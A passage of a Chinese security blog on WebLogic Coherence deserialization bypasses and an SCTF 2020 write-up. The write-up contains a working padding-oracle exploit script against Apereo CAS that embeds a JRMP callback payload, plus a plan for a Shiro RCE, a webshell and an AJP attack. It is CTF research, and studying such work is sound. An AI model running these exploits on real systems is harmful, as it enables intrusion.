bounty</del>前人可能没有注意到有进入到readExternal(DataInput in)通路。</li><li>为什么readExternal(ObjectInput in)可以续上？我想因为readExternal本来就是给程序员自定义反序列化数据的地方，而readExternal(DataInput in)里面是coherence自己的反序列化逻辑，所以从ObjectInput in能到DataInput in算是题中应有之义。</li><li>这种反序列化绕过方式属于哪种类型？我想应该是二阶反序列化类型。</li></ol><h2 id="CASE-2"><a href="#CASE-2" class="headerlink" title="CASE 2"></a>CASE 2</h2><p>几天后，我收到了官方回复的邮件，从它们回复中可以看到它们把这个链关键认定为RCE involving LambdaIdentity。此时，我觉得很奇怪难道后半段不是可以灵活吗？如果我重新找一个新入口配上7u21后半段岂不是能再混一个CVE？。然后抓了一下整个coherence lib目录下的所有jar包的readExternal(java.io.ObjectInput) 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br><span class="line">com.tangosol.coherence.servlet.AbstractHttpSessionModel</span><br><span class="line">com.tangosol.coherence.servlet.AttributeHolder</span><br></pre></td></tr></table></figure><p>倒数两个是比上次只跑conherence.jar多出来的，经过验证在conherence-web.jar中的com.tangosol.coherence.servlet.AttributeHolder满足条件。<br><img src="image-20201122174447449.png" alt="image-20201122174447449.png"><br>把TemplatesImpl打到m_Value之后，发送payload后发现控制台报错。发生肾么事了？我一看，哦原来啊是没过黑名单，这就引起了对这个漏洞细节的进一步探究。<br><img src="image-20201122191637309.png" alt="image-20201122191637309.png"><br>在com.tangosol.util.ExternalizableHelper#readObjectInternal下断点可以看到它并没进入，预期的readExternalizableLite而是进入了readSerializable中<br><img src="image-20201122192730759.png" alt="image-20201122192730759.png"><br>在readObject中DataInput in会重新“转换”回带黑名单的InputStream，所以失败。<br><img src="image-20201122192854446.png" alt="image-20201122192854446.png"><br>此时，心理又有两个疑问</p><ol><li>输入流为我所控，那我把nType改成10，强行进入readExternalizableLite行不行？</li><li>为什么RemoteConstructor可以打成功？</li></ol><p>首先回答第一个问题，可以但是行不通，就算真的把TemplatesImpl new出来了之后的强转也过不了。<br><img src="image-20201122193516298.png" alt="image-20201122193516298.png"><br>其次，就算真的成功他也没有readExternal方法（即没有实现ExternalizableLite接口）。<br><img src="image-20201122193856818.png" alt="image-20201122193856818.png"><br>到这里RemoteConstructor可以打的原因也很明显了RemoteConstructor实现了ExternalizableLite接口。<br><img src="image-20201122194211848.png" alt="image-20201122194211848.png"><br>所以这个攻击面的利用条件是：</p><ol><li>一个java.io.ObjectInput强转成java.io.DataInput的点</li><li>强转成java.io.DataInput后需要有进行ExternalizableHelper.readObject的操作</li><li>一个实现了ExternalizableLite的接口高危类</li></ol><p>不过这已经足够了，因为conherence里面的Extractor都实现这个接口。<br><img src="image-20201122195930855.png" alt="image-20201122195930855.png"></p><p>一开始，我其实是想手工挖的，那段时间真的是看的我头皮发麻，而且因为实现了ExternalizableLite接口是在是太多也很难保证自己完全不重不漏，大多数readExternal里面都只有赋值没有别的操作，休息了几天后我决定用魔法打败魔法，拿之前写的自动化工具跑。结合历史漏洞我决定以readExternal(DataInput in)为source，以com.tangosol.util.extractor.AbstractExtractor#compare为sink开动化跑。</p><p>跑了一会，从一堆误报中看到了希望的曙光。<br><img src="image-20201122201724495.png" alt="image-20201122201724495.png"><br>最后证明了这个确实可行。</p><h2 id="CASE-3"><a href="#CASE-3" class="headerlink" title="CASE 3"></a>CASE 3</h2><p>在手工看的那段时间，虽然头皮发麻但并不是没有收获，看了几个版本的weblogic经历了“卧槽,这里怕不是有洞”到”卧槽,被黑名单全防住了，全防出去了啊”很多次后，我隐约觉得coherence已经可以造成危害的点全部加入黑名单套餐了，不会有全新的链了（等被打脸），但二阶反序列化的点还有机会！</p><p>这次引起我注意的是com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResult。可以看到在反序列化时它会读一个Binary进来，然后对Binary进行一个fromBinary的操作。<br><img src="image-20201123175647803.png" alt="image-20201123175647803.png"><br>我注意到com.tangosol.util.ExternalizableHelper#fromByteArray中会把byte[]数组重建成BufferInput进行反序列化，因为重建所以没有黑名单过滤。<br><img src="image-20201123195621071.png" alt="image-20201123195621071.png"><br><img src="image-20201123195720598.png" alt="image-20201123195720598.png"></p><p>这个时候，我感觉又成了。构造好payload打过去，被weblogic防出去了。一看，是2找不到类，后面确认了一下，这个类在coherence-jcahe.jar里面，这个包并没有被weblogic加载进来。<br><img src="image-20201123202848977.png" alt="image-20201123202848977.png"><br>但是就这么放弃是不可能的，我决定找到其他fromBinary的调用点，这里我选择直接打开JD-GUI搜，发现SimpleBinaryEntry这个看起来品相很好，它的getValue调用了ExternalizableHelper.fromBinary方法而其toString方法又调用了getValue。<br><img src="image-20201122203856852.png" alt="image-20201122203856852.png"><br><img src="image-20201122203911099.png" alt="image-20201122203911099.png"></p><p>这里还有细节需要注意m_serializer是transient的，如果用BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()是不可行的，后续反序列化会因为m_serializer为null而失败。</p><p>所以这里还是需要以readExternal为入口进来，<del>因为readExternal是不受transient限制的。</del>因为走这种反序列化当对象实现了SerializerAware时会自动插入serializer。<br><img src="image.png" alt="image.png"></p><p><img src="image-20201123210123344.png" alt="image-20201123210123344.png"></p><p>半自动化跑了一下，虽然没有绝对跑出来（没有用指针分析），但是有一个参考已经足够了：<br><img src="image-20201126145458994.png" alt="image-20201126145458994.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下trik</p><ul><li>在挖新的之前，可以<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">调研历史CVE和补丁学习前人思路</a>。</li><li>找二阶反序列化，二阶反序列化往往出现在readExternal处。二阶反序列化，既可以是标准的Byte字节流型（CVE-2016-0638），也可以是jrmp带外利用（CVE-2017-3248），还可以是一些变种比如这里的cve-2020-14756开发自实现的反序列化，甚至可以是开发在反序列化时使用了自己继承的ObjectInputStream里面但是里面重写readResolve方法（覆盖了原来的黑名单检查）。</li><li>自动化</li></ul>]]></content>
    
    <summary type="html">
    
      To share my method
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SCTF 2020 两道Login Me预期解的核心技术</title>
    <link href="http://yoursite.com/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</id>
    <published>2020-07-17T13:39:57.000Z</published>
    <updated>2020-07-17T13:51:17.712Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="Login-Me-cas-4-x-excution-rce（黑盒）"><a href="#Login-Me-cas-4-x-excution-rce（黑盒）" class="headerlink" title="Login Me - cas 4.x excution rce（黑盒）"></a>Login Me - cas 4.x excution rce（黑盒）</h2><p>详细的漏洞分析可以参考<a href="https://xz.aliyun.com/t/7032">Apereo CAS 4.X execution参数反序列化漏洞分析</a>这里不在赘述。文章提到了，前后两个版本区间的encode方法是不一样。</p><p>在cas4.x-cas.4.1.5中的加密伪代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = gzip(Java Serialized data)</span><br><span class="line">body = aes128_cbc_encode(key, iv, payload))</span><br><span class="line">header = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10'</span>+iv+<span class="string">'\x00\x00\x00\x06'</span>+<span class="string">'aes128'</span></span><br><span class="line">excution = uuid + b64encode(header + body)</span><br></pre></td></tr></table></figure><p>CAS 4.1.7 ～ 4.2.X的加密伪代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))</span><br><span class="line">data = b64encode(cipher)</span><br><span class="line">jwsToken = jws.sign(data, jws_key, algorithm=‘HS512’)</span><br><span class="line">excution = uuid + b64encode(jwsToken)</span><br></pre></td></tr></table></figure><p>因为encode的变化excution是不一样的亦可作为判断版本的指纹。</p><ul><li>cas4.x-cas.4.1.5之前特征：execution base64解码出来以\x00\x00\x00\x22\x00\x00\x00\x10开头。</li></ul><p><img src="1593850236393-8b8d508a-550c-4e7e-b5ea-9c8c1af56877.png#align=left&display=inline&height=224&margin=%5Bobject%20Object%5D&name=image.png&originHeight=291&originWidth=970&size=78900&status=done&style=none&width=746" alt="image.png"></p><ul><li>4.1.6之后特征：execution两次base64解码出来不是乱码而是jws格式（header.body.sign）的字符串。</li></ul><p><img src="1593850262798-64d1e785-98a0-4bce-ab72-936f97704d11.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=982&size=105001&status=done&style=none&width=746" alt="image.png"><br>解密题目的execution不难发现，环境是4.x-4.1.5。此外看到，前后两个版本的encode的方式唯一的差异是4.1.6之后execution的需要进行加密签名，联系到它使用的是aes/cbc说到这应该很熟悉了吧padding oracle！</p><p>这里padding oracle，仍然需要讲究技巧，直接生成cc链一类的payload进行padding大约需要padding 114组左右数据（题目两小时重启一次，gadget还需要fuzz，这是一个难以完成的任务），但是如果环境能出网的话用jrmp就需要padding 14组数据左右了，这里视环境情况仍然需要跑1h-3h不等，但是通过的分析过<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">cve-2018-2628</a>之后发现jrmp的payload的可以更短只需要7组，我在同区域的阿里云上多线程跑不到20分钟就有了结果（这也是题目描述Time is Flag的暗示233333）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jws</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">start_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line"></span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">header_mode = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10&#123;iv&#125;\x00\x00\x00\x06aes128'</span></span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">URL= <span class="string">"http://ip:port/login"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"en-US,en;q=0.5"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"JSESSIONID"</span>:<span class="string">"ADF6653ED3808BE63B052BCED53494A3"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64Padding</span><span class="params">(data)</span>:</span></span><br><span class="line">missing_padding = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> missing_padding <span class="keyword">and</span> missing_padding != <span class="number">4</span>:</span><br><span class="line">data += <span class="string">'='</span> * missing_padding</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data)</span>:</span></span><br><span class="line">gzip_compress = zlib.compressobj(<span class="number">9</span>, zlib.DEFLATED, zlib.MAX_WBITS | <span class="number">16</span>)</span><br><span class="line">data = gzip_compress.compress(data) + gzip_compress.flush()</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitFlippingAttack</span><span class="params">(fake_value, orgin_value)</span>:</span></span><br><span class="line">iv = []</span><br><span class="line"><span class="keyword">for</span> f, o <span class="keyword">in</span> zip(fake_value, orgin_value):</span><br><span class="line">iv.append(chr(ord(f) ^ ord(o)))</span><br><span class="line"><span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"><span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span><span class="params">(paramsPost,w)</span>:</span></span><br><span class="line">response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">return</span> w, response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paddingOracle</span><span class="params">(value)</span>:</span></span><br><span class="line">fakeiv = list(chr(<span class="number">0</span>)*<span class="number">16</span>)</span><br><span class="line">intermediary_value_reverse = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">num = <span class="number">16</span></span><br><span class="line">response_result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>-num+<span class="number">1</span>, num):</span><br><span class="line">jobs = []</span><br><span class="line">pool = ThreadPool(num)</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(j, j + num):</span><br><span class="line">fakeiv[N<span class="number">-1</span>-i] = chr(w)</span><br><span class="line"><span class="comment">#print(fakeiv)</span></span><br><span class="line">fake_iv = <span class="string">''</span>.join(fakeiv)</span><br><span class="line">paramsPost = &#123;<span class="string">"execution"</span>:<span class="string">"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_"</span> + base64.b64encode(header + body + fake_iv + value),<span class="string">"password"</span>:<span class="string">"admin"</span>,<span class="string">"submit"</span>:<span class="string">"LOGIN"</span>,<span class="string">"_eventId"</span>:<span class="string">"submit"</span>,<span class="string">"lt"</span>:<span class="string">"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org"</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">job = pool.apply_async(send_request, (paramsPost,w))</span><br><span class="line">jobs.append(job)</span><br><span class="line"></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> jobs:</span><br><span class="line">j_value, response = w.get()</span><br><span class="line"><span class="comment">#print(response)</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"200"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">response_result.append(j_value)</span><br><span class="line">print(response_result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(response_result) == <span class="number">1</span>:</span><br><span class="line">j_value  = response_result[<span class="number">0</span>]</span><br><span class="line">intermediary_value_reverse.append(chr((i+<span class="number">1</span>) ^ j_value))</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">0</span>, i+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">fakeiv[N-w<span class="number">-1</span>] = chr(ord(intermediary_value_reverse[w]) ^ (i+<span class="number">2</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(fakeiv, intermediary_value_reverse, w, i+<span class="number">1</span>)</span><br><span class="line">print(base64.b64encode(value))</span><br><span class="line">print(e)</span><br><span class="line">exit()</span><br><span class="line">print(fakeiv)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(response_result)</span><br><span class="line">print(<span class="string">"Exit Because count of is "</span> + str(len(response_result)))</span><br><span class="line">exit()</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"sleep"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">intermediary_value = intermediary_value_reverse[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> intermediary_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"><span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, <span class="string">'JRMPClient2'</span>, <span class="string">'your_ip:your_port'</span>],stdout=subprocess.PIPE)</span><br><span class="line">payload = popen.stdout.read()</span><br><span class="line">payload = pad_string(compress(payload))</span><br><span class="line"></span><br><span class="line">excution = <span class="string">"input_excution"</span></span><br><span class="line"></span><br><span class="line">body = base64.b64decode(excution)[<span class="number">34</span>:]</span><br><span class="line">header = base64.b64decode(excution)[<span class="number">0</span>:<span class="number">34</span>]</span><br><span class="line">iv = list(header[<span class="number">8</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_value_arr = re.findall(<span class="string">r'[\s\S]&#123;16&#125;'</span>, payload)</span><br><span class="line">fake_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">value = body[<span class="number">-16</span>:]</span><br><span class="line"></span><br><span class="line">payload_value_arr = [value]</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">all_count = len(fake_value_arr)</span><br><span class="line">print(all_count)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fake_value_arr:</span><br><span class="line">intermediary_value = paddingOracle(value)</span><br><span class="line">print(value, intermediary_value)</span><br><span class="line">fakeIv = bitFlippingAttack(intermediary_value, i)</span><br><span class="line">value = <span class="string">''</span>.join(fakeIv)</span><br><span class="line">payload_value_arr.append(value)</span><br><span class="line"></span><br><span class="line">print(count, all_count)</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakeiv = payload_value_arr.pop()</span><br><span class="line">payload_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">payload = header_mode.format(iv=fakeiv) + <span class="string">''</span>.join(payload_value_arr)</span><br><span class="line">print(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">end_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">print(start_time,end_time)</span><br><span class="line">f = open(<span class="string">'/tmp/cas.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(base64.b64encode(payload))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>通过jrmp出来fuzz gadget也很方便，这里用的是JDK7u21（在自己做的时候发现统一端口请求一次jrmp之后，后面的再一次请求会变得很慢，这里可以选择再跑一个端口出来交替使用）。接下来就是常见的读取数据库连接字符串查用户登陆的操作了，在此不细表。</p><h2 id="Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-acl（白盒）"><a href="#Login-Me-Again-shiro-rce-amp-amp-shiro-bypass-acl（白盒）" class="headerlink" title="Login Me Again - shiro rce &amp;&amp; shiro bypass acl（白盒）"></a>Login Me Again - shiro rce &amp;&amp; shiro bypass acl（白盒）</h2><p>这道题，由我和@leixiao合作完成，前半部分shiro不出网rce利用由leixiao负责完成，后半部分shiro bvpass acl部分由我负责完成。<br>先贴一个当时构思这道题时候的速记（有删改）：</p><blockquote><p>环境：外网一个有shiro rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。</p></blockquote><blockquote><p>攻击思路<br>1.通过注入有socks5代理功能的webshell代理到内网。<br>2.找shiro新的权限绕过方法或者谷歌搜到我之前找的shiro ajp越权：<a href="https://issues.apache.org/jira/browse/SHIRO-760">https://issues.apache.org/jira/browse/SHIRO-760</a>，越权上传文件或者用c0ny1师傅的姿势。<br>3.用ajp漏洞包含刚才上传的图片rce</p></blockquote><blockquote><p>利用难点：1.市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。2.自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。3.市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。</p></blockquote><p>下面就从利用难点，逐一说明</p><h3 id="无文件socks5代理"><a href="#无文件socks5代理" class="headerlink" title="无文件socks5代理"></a>无文件socks5代理</h3><p>因为这里是shiro，shiro本身也是一个filter，所以内存马最好也搞成filter(优先级最高)，内存马的思路可以看基于<a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">Tomcat无文件Webshell研究</a>。至于具体filter的逻辑，改一下reg就好了，下面贴一下leixiao师傅的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 